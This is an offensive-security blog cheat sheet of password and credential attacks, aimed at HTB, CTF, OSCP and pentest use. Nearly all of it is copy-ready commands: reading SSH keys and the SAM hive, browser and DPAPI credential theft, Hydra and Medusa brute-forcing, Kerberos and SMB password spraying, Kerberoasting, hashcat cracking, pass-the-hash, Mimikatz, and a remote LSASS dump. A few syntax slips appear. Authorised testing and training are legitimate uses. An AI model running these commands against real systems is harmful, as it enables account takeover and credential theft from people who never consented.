---
layout: post
title: "Password Attacks & Credential Hunting Cheatsheet"
subtitle: "Bruteforce, credential harvesting, hash cracking, spraying and password reuse attacks for HTB, CTFs and real-world pentests"
tags: [passwords, cracking, hashcat, bruteforce, oscp, htb, ctf, spraying]
---

A compact and highly practical cheat sheet for password attacks, credential extraction, spraying, and hash cracking during HTB, CTFs, OSCP labs and real-world pentests.

---

# 0. ESSENTIAL TOOLS & RESOURCES

## Cracking Tools
- **Hashcat**: https://github.com/hashcat/hashcat  
- **John the Ripper**: https://www.openwall.com/john/  
- **Hydra**  
- **Medusa**  
- **Ncrack**  

## Credential Harvesting
- **LaZagne**  
- **Mimikatz**  
- **Impacket** (secretsdump, lookupsid, psexec, etc.)  
- **Seatbelt** / **SharpDPAPI**  
- **WinPEAS/PEASS**  

## Wordlists
- **SecLists** (rockyou, credentials, usernames, rules)  
- **Probable-Wordlists**  
- **Kaonashi** (amazing mutation list)  
- **Skycrack lists (9GB+)**  

## Rule packs (Hashcat)
- `best64.rule`  
- `OneRuleToRuleThemAll.rule`  
- `dive.rule`  

---

# 1. CREDENTIAL HUNTING (LOCAL)

## Linux: Quick wins
```

cat ~/.bash_history
cat ~/.ssh/id_rsa
grep -R "password" /home/* 2>/dev/null
grep -R "PASS" /etc 2>/dev/null

```

## Windows: Quick wins
```

dir C:\Users*\AppData\Roaming
findstr /si password *.txt *.ini *.xml
type C:\Windows\System32\config\SAM

```

## Browser stored credentials
```

LaZagne.exe browsers

```

## DPAPI credential extraction (Windows)
```

SharpDPAPI.exe masterkeys
SharpDPAPI.exe creds

```

## Winlogon Passwords
```

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

```

---

# 2. CREDENTIAL HUNTING (REMOTE / NETWORK)

## enumerate SMB users (RID cycling)
```

rpcclient -U "" -N target -c enumdomusers

```

## LDAP search (anonymous)
```

ldapsearch -x -H ldap://TARGET -b "dc=corp,dc=local"

```

## Netlogon enumeration (Impacket)
```

samrdump.py TARGET

```

## Share crawling with smbmap
```

smbmap -H TARGET -R

```

---

# 3. BRUTEFORCING LOGIN PORTALS (HYDRA)

## HTTP POST brute-force
```

hydra -l admin -P rockyou.txt TARGET http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"

```

## SSH brute-force
```

hydra -l user -P rockyou.txt ssh://TARGET

```

## RDP brute-force
```

hydra -l user -P rockyou.txt rdp://TARGET

```

## FTP brute-force
```

hydra -l user -P rockyou.txt ftp://TARGET

```

---

# 4. MEDUSA & NCRACK (FAST BRUTEFORCE)

## Medusa SSH
```

medusa -h TARGET -u user -P rockyou.txt -M ssh

```

## Ncrack RDP
```

ncrack -vv --user user -P rockyou.txt rdp://TARGET

```

---

# 5. PASSWORD SPRAYING (AD / REMOTE SERVICES)

🔥 *Safer than brute-force. Use low frequency.*

## Kerberos Password Spraying (Impacket)
```

kerbrute userenum -d corp.local users.txt
kerbrute passwordspray -d corp.local users.txt "Password123"

```

## CrackMapExec SMB spraying
```

cme smb TARGET -u users.txt -p "Password123!"

```

## WinRM spraying
```

cme winrm TARGET -u users.txt -p "Winter2024"

```

## HTTP/LDAP spraying
```

cme ldap DC -u users.txt -p 'Password1'

```

---

# 6. HASH IDENTIFICATION

## hashid
```

hashid hash.txt

```

## hash-identifier
```

hash-identifier

```

## John auto-detect
```

john --format=raw-sha1 hash.txt

```

---

# 7. HASH CRACKING WITH HASHCAT

## Basic single-hash crack
```

hashcat -m 0 hash.txt rockyou.txt

```

## With rule-based mutation
```

hashcat -m 0 hash.txt rockyou.txt -r best64.rule

```

## NTLM (mode 1000)
```

hashcat -m 1000 ntlm.txt rockyou.txt

```

## bcrypt (mode 3200)
```

hashcat -m 3200 hash.txt rockyou.txt

```

## Kerberos AS-REP Roast (mode 18200)
```

hashcat -m 18200 asrep.txt rockyou.txt

```

## Kerberos TGS (mode 13100)
```

hashcat -m 13100 kerberoast.txt rockyou.txt

```

## WPA2 handshake (mode 22000)
```

hashcat -m 22000 wifi.hc22000 rockyou.txt

```

---

# 8. MASK ATTACKS (PURE GOLD FOR CTFs)

Mask attack example:
```

?l = lowercase
?u = uppercase
?d = digit
?s = symbol

```

### Example: 3 lowercase + 2 digits
```

hashcat -m 0 hash.txt -a 3 ?l?l?l?d?d

```

### Example: Common password pattern
```

?u?l?l?l?d?d?d?

```

---

# 9. RULE-BASED ATTACKS (SUPER EFFECTIVE)

### Using **OneRuleToRuleThemAll**
```

hashcat -m 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule

```

### Using the famous **dive.rule**
```

hashcat -m 0 hash.txt rockyou.txt -r dive.rule

```

### Using **best64.rule** for fast wins
```

hashcat -m 0 hash.txt rockyou.txt -r best64.rule

```

---

# 10. KERBEROS PASSWORD ATTACKS (AD)

## Kerberoasting (Impacket)
```

GetUserSPNs.py corp.local/user:pass -dc-ip DC_IP -request

```

Output hashes → crack with:
```

hashcat -m 13100 hash.txt rockyou.txt

```

## AS-REP Roasting (no-preauth accounts)
```

GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip DC_IP

```

Crack with:
```

hashcat -m 18200 asrep.txt rockyou.txt

```

---

# 11. PASS-THE-HASH / PASS-THE-TICKET

## SMB PTH
```

psexec.py corp.local/user@TARGET -hashes [LM:NT](LM:NT)

```

## WinRM PTH
```

evil-winrm -i TARGET -u user -H <NTLM_HASH>

```

## TGT pass-the-ticket (Rubeus)
```

Rubeus.exe ptt /ticket:ticket.kirbi

```

---

# 12. PASSWORD REUSE & QUICK WINS

Search for passwords in:
```

.git/
.env
config.php
wp-config.php
docker-compose.yml

```

Search globally:
```

grep -R "password" .
grep -R "secret" .

```

Browser credential stores:
```

LaZagne.exe browsers

```

---

# 13. EXTRACTING PASSWORDS FROM MEMORY

## Mimikatz (LSASS dump)
```

mimikatz.exe privilege::debug sekurlsa::logonpasswords

```

## Dumping LSASS remotely
```

psexec.py -hashes <hash> user@TARGET "rundll32.exe comsvcs.dll, MiniDump  lsass.exe lsass.dmp full"

```

## Samurai trick (Impacket)
```

secretsdump.py target

```

---

# 14. WORDLIST OPTIMIZATION

### Clean duplicates
```

sort -u wordlist.txt -o final.txt

```

### Append numbers (common pattern)
```

crunch 8 10 -t pass%%%%

```

### Combine multiple lists
```

cat *.txt | sort -u > mega.txt

```

---

# Final Notes

This cheat sheet covers:
* Brute-force & password spraying  
* Username enumeration & credential hunting  
* Hash identification & cracking  
* Kerberos roasting (AS-REP/TGS)  
* Pass-the-hash & Pass-the-ticket  
* Memory credential extraction  
* Rule-based cracking & mask attacks  
* Password reuse techniques  
* SSH/HTTP/RDP/SMB brute-force  
* Wordlist building & mutation  

Use it during HTB, OSCP, CTFs, Active Directory labs and real-world pentests.

---